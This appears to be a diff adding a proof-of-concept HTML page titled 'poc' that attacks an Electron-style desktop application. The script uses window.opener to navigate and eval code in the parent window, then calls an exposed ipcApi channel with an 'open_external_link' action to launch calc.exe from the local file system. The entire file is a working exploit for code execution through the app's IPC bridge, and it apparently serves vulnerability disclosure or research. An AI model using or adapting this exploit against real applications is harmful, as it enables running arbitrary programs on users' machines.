@@ -1,0 +1,16 @@
+<!DOCTYPE HTML>
+<html>
+<h1>poc</h1>
+<script>
+opener.location = '/';
+
+if (opener.opener != undefined) {
+    opener.eval('opener.location.href = "/";');
+    setTimeout(function(){
+        opener.opener.ipcApi.send('main-action-triggered',{actionEnum:'open_external_link',payload:'file:///c:/windows/system32/calc.exe'});
+    },'1000');
+} else {
+    opener.ipcApi.send('main-action-triggered',{actionEnum:'open_external_link',payload:'file:///c:/windows/system32/calc.exe'});
+}
+</script>
+</html>
